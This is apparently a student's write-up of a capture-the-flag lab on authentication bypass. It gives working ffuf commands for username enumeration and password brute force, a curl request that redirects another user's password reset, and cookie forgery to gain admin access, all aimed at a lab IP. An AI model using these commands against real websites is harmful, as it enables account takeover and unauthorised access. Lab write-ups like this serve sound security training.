# Authentication Bypass

### Task 1: Brief

This task was about setting up the VPN connection to the THM network.

### Task 2: Username Enumeration

I ran the command `ffuf -w names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.220.210/customers/signup -mr "username already exists"`, and I got the following output:

![](<../../.gitbook/assets/image (568).png>)

### Task 3: Brute Force

I ran the following command:

`ffuf -w valid_usernames.txt:W1,10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.220.210/customers/login -fc 200`

I then got this as the result:

![](<../../.gitbook/assets/image (466).png>)

### Task 4: Logic Flaw

For this one, you have to modify the command to be for the attacker, in this case, **Steve**. Since we have access to Steve's account, we can get the password reset email forwarded there:

`curl 'http://10.10.220.210/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=steve@customer.acmeitsupport.thm'`

After clicking on the reset link, you see the following in your Support Tickets:

![](<../../.gitbook/assets/image (621).png>)

### Task 5: Cookie Tampering

For the first question, the command to get the flag is already given to you by THM:

`curl -H "Cookie: logged_in=true; admin=true" http://10.10.220.210/cookie-test`

![](<../../.gitbook/assets/image (410).png>)

For the next question, I used [https://crackstation.net/](https://crackstation.net/), in order to crack the MD5 hash of 3b2a1053e3270077456a79192070aa78:

![](<../../.gitbook/assets/image (370) (1) (1).png>)

For the next question, I ran the following command:

`echo "VEhNe0JBU0U2NF9FTkNPRElOR30=" | base64 -d`

This gave me the flag:

![](<../../.gitbook/assets/image (515).png>)

The last question I just had to change the previous step a bit. In order to encode, you just take the `-d` flag out. I then entered the following command and got the flag:

`echo "{"id":1,"admin":true}" | base64`

![](<../../.gitbook/assets/image (570).png>)
